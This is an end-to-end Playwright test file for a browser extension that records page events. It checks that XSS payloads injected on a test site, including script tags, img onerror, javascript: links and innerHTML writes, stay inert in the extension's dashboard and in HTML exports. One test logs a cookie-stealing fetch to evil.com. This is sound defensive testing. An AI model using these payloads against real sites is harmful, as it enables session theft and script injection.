// tests/e2e-xss.spec.ts — P5.4 HTML XSS 深度测试
import { test, expect } from '@playwright/test';
import { launch_extension, open_popup, open_site, TEST_SITES } from './e2e-helpers';

test.describe.serial('HTML XSS 防护', () => {
    let fix: Awaited<ReturnType<typeof launch_extension>>;

    test.beforeAll(async () => { fix = await launch_extension(); });
    test.afterAll(async () => { await fix.context.close(); });

    test('含脚本标签的事件不会导致 XSS', async () => {
        const popup = await open_popup(fix);
        await popup.locator('#startBtn').click();
        await popup.waitForTimeout(500);

        // 打开 baidu 并在搜索框注入 XSS payload
        const site = await open_site(fix, TEST_SITES.baidu);
        await site.waitForTimeout(2000);

        const search_input = site.locator('#kw');
        if (await search_input.isVisible()) {
            await search_input.click();
            // 输入含 <script> 的内容
            await search_input.fill('<script>alert(1)</script>');
            await site.locator('#su').click();
            await site.waitForTimeout(3000);
        }

        // 注入更多 XSS payload
        await site.evaluate(() => {
            // 注入到 console
            console.log('<img src=x onerror=alert(1)>');
            console.error('<script>alert("xss")</script>');
        });
        await site.waitForTimeout(1500);

        await popup.bringToFront();
        await popup.waitForTimeout(500);
        await popup.locator('#stopBtn').click();
        await popup.waitForTimeout(1500);

        // 进入 dashboard
        const [dashboard] = await Promise.all([
            fix.context.waitForEvent('page', { timeout: 10000 }),
            popup.locator('#openDetailBtn').click(),
        ]);
        await dashboard.waitForLoadState('domcontentloaded');
        await dashboard.waitForTimeout(2000);

        // 检查 dashboard 中没有活动的 script 标签注入
        const scripts_in_body = await dashboard.evaluate(() => {
            const scripts = document.querySelectorAll('script:not([src])');
            const contents: string[] = [];
            scripts.forEach((s) => {
                const text = s.textContent || '';
                if (text.includes('alert')) contents.push(text);
            });
            return contents;
        });
        // 不应有任何含 alert 的内联脚本
        expect(scripts_in_body).toHaveLength(0);

        await dashboard.close();
        await site.close();
        await popup.close();
    });

    test('导出 HTML 文件再打开无脚本执行', async () => {
        const popup = await open_popup(fix);
        await popup.locator('#startBtn').click();
        await popup.waitForTimeout(500);

        const site = await open_site(fix, TEST_SITES.baidu);
        await site.waitForTimeout(2000);

        // 触发含 XSS 的事件
        const search_input = site.locator('#kw');
        if (await search_input.isVisible()) {
            await search_input.click();
            await search_input.fill('<script>alert("xss")</script>');
            await site.locator('#su').click();
            await site.waitForTimeout(3000);
        }

        await popup.bringToFront();
        await popup.waitForTimeout(500);
        await popup.locator('#stopBtn').click();
        await popup.waitForTimeout(1500);
        await expect(popup.locator('.act-done')).toBeVisible();

        // 进入 dashboard 导出 HTML
        const [dashboard] = await Promise.all([
            fix.context.waitForEvent('page', { timeout: 10000 }),
            popup.locator('#openDetailBtn').click(),
        ]);
        await dashboard.waitForLoadState('domcontentloaded');
        await dashboard.waitForTimeout(2000);

        // 尝试触发 HTML 导出
        const export_html_btn = dashboard.locator('[data-export="html"]');
        if (await export_html_btn.isVisible()) {
            // 监听下载事件
            const [download] = await Promise.all([
                dashboard.waitForEvent('download', { timeout: 10000 }).catch(() => null),
                export_html_btn.click(),
            ]);
            if (download) {
                const path = await download.path();
                expect(path).toBeTruthy();

                // 用 Playwright 打开导出的 HTML 文件验证无脚本执行
                const verify_page = await fix.context.newPage();
                let alert_fired = false;
                verify_page.on('dialog', () => {
                    alert_fired = true;
                });
                await verify_page.goto(`file://${path}`, { waitUntil: 'domcontentloaded', timeout: 10000 });
                await verify_page.waitForTimeout(1000);

                // 不应有 alert 对话框被触发
                expect(alert_fired).toBe(false);
                await verify_page.close();
            }
        }

        await dashboard.close();
        await site.close();
        await popup.close();
    });

    test('eval 注入不会被执行', async () => {
        const popup = await open_popup(fix);
        await popup.locator('#startBtn').click();
        await popup.waitForTimeout(500);

        const site = await open_site(fix, TEST_SITES.baidu);
        await site.waitForTimeout(2000);

        // 通过 console 注入 eval payload
        await site.evaluate(() => {
            console.log("eval('xss')");
            console.error("eval('fetch(\"http://evil.com/\"+document.cookie)')");
        });
        await site.waitForTimeout(1500);

        await popup.bringToFront();
        await popup.locator('#stopBtn').click();
        await popup.waitForTimeout(1500);

        const [dashboard] = await Promise.all([
            fix.context.waitForEvent('page', { timeout: 10000 }),
            popup.locator('#openDetailBtn').click(),
        ]);
        await dashboard.waitForLoadState('domcontentloaded');
        await dashboard.waitForTimeout(2000);

        // 验证 dashboard body 中不包含可执行的 eval 调用 ——
        // eval 字符串应作为文本转义出现，而不应出现在内联脚本中
        const has_eval_in_script = await dashboard.evaluate(() => {
            const scripts = document.querySelectorAll('script:not([src])');
            for (const s of scripts) {
                if (s.textContent && s.textContent.includes('eval(')) return true;
            }
            return false;
        });
        expect(has_eval_in_script).toBe(false);

        await dashboard.close();
        await site.close();
        await popup.close();
    });

    test('document.write 注入不会被执行', async () => {
        const popup = await open_popup(fix);
        await popup.locator('#startBtn').click();
        await popup.waitForTimeout(500);

        const site = await open_site(fix, TEST_SITES.baidu);
        await site.waitForTimeout(2000);

        // 注入 document.write payload：console + 页面内执行
        await site.evaluate(() => {
            console.log("document.write('<img src=x onerror=alert(1)>')");
            try {
                document.write('<img src=x onerror=alert(1)>');
            } catch {
                // document.write 在已加载页面中会覆盖文档，忽略
            }
        });
        await site.waitForTimeout(1500);

        await popup.bringToFront();
        await popup.locator('#stopBtn').click();
        await popup.waitForTimeout(1500);

        const [dashboard] = await Promise.all([
            fix.context.waitForEvent('page', { timeout: 10000 }),
            popup.locator('#openDetailBtn').click(),
        ]);
        await dashboard.waitForLoadState('domcontentloaded');
        await dashboard.waitForTimeout(2000);

        // dashboard 中不应出现包含 onerror=alert 的内联脚本
        const has_onerror_in_script = await dashboard.evaluate(() => {
            const scripts = document.querySelectorAll('script:not([src])');
            for (const s of scripts) {
                const t = s.textContent || '';
                if (t.includes('onerror') && t.includes('alert')) return true;
            }
            return false;
        });
        expect(has_onerror_in_script).toBe(false);

        await dashboard.close();
        await site.close();
        await popup.close();
    });

    test('innerHTML 注入不会造成 DOM XSS', async () => {
        const popup = await open_popup(fix);
        await popup.locator('#startBtn').click();
        await popup.waitForTimeout(500);

        const site = await open_site(fix, TEST_SITES.baidu);
        await site.waitForTimeout(2000);

        // 注入 innerHTML 赋值：console 日志 + DOM 操作
        await site.evaluate(() => {
            console.log("document.getElementById('x').innerHTML = '<img src=x onerror=alert(1)>'");
            // 创建一个测试元素，设置 innerHTML
            const div = document.createElement('div');
            div.id = 'xss_innerhtml_test';
            div.innerHTML = '<img src=x onerror=alert(1)>';
            document.body.appendChild(div);
        });
        await site.waitForTimeout(1500);

        await popup.bringToFront();
        await popup.locator('#stopBtn').click();
        await popup.waitForTimeout(1500);

        const [dashboard] = await Promise.all([
            fix.context.waitForEvent('page', { timeout: 10000 }),
            popup.locator('#openDetailBtn').click(),
        ]);
        await dashboard.waitForLoadState('domcontentloaded');
        await dashboard.waitForTimeout(2000);

        // dashboard 不应包含 innerHTML 注入产生的活动脚本或事件处理器
        const has_innerhtml_xss = await dashboard.evaluate(() => {
            const scripts = document.querySelectorAll('script:not([src])');
            for (const s of scripts) {
                const t = s.textContent || '';
                if (t.includes('innerHTML') && t.includes('onerror')) return true;
            }
            return false;
        });
        expect(has_innerhtml_xss).toBe(false);

        // 同时验证 body 中没有带 onerror 属性的 img 标签（来自注入）
        const imgs_with_onerror = await dashboard.evaluate(() => {
            const imgs = document.querySelectorAll('img[onerror]');
            return imgs.length;
        });
        expect(imgs_with_onerror).toBe(0);

        await dashboard.close();
        await site.close();
        await popup.close();
    });

    test('javascript: URL 不会被激活', async () => {
        const popup = await open_popup(fix);
        await popup.locator('#startBtn').click();
        await popup.waitForTimeout(500);

        const site = await open_site(fix, TEST_SITES.baidu);
        await site.waitForTimeout(2000);

        // 注入 javascript: 伪协议链接
        await site.evaluate(() => {
            // 作为用户可见内容注入 javascript: 链接
            const a = document.createElement('a');
            a.id = 'xss_js_url_test';
            a.href = 'javascript:alert(1)';
            a.textContent = 'Click me';
            document.body.appendChild(a);
            // 通过 console 注入
            console.log('<a href="javascript:alert(1)">Click</a>');
            console.log("location.href = 'javascript:alert(document.cookie)'");
        });
        await site.waitForTimeout(1500);

        await popup.bringToFront();
        await popup.locator('#stopBtn').click();
        await popup.waitForTimeout(1500);

        const [dashboard] = await Promise.all([
            fix.context.waitForEvent('page', { timeout: 10000 }),
            popup.locator('#openDetailBtn').click(),
        ]);
        await dashboard.waitForLoadState('domcontentloaded');
        await dashboard.waitForTimeout(2000);

        // dashboard 中不应存在可点击的 javascript: 链接（href 含有 javascript:）
        const js_url_links = await dashboard.evaluate(() => {
            const links = document.querySelectorAll('a[href^="javascript:"]');
            return links.length;
        });
        expect(js_url_links).toBe(0);

        // 同时验证内联脚本中没有 javascript: 伪协议注入
        const has_js_url_in_script = await dashboard.evaluate(() => {
            const scripts = document.querySelectorAll('script:not([src])');
            for (const s of scripts) {
                const t = s.textContent || '';
                if (t.includes('javascript:') && t.includes('alert')) return true;
            }
            return false;
        });
        expect(has_js_url_in_script).toBe(false);

        await dashboard.close();
        await site.close();
        await popup.close();
    });
});
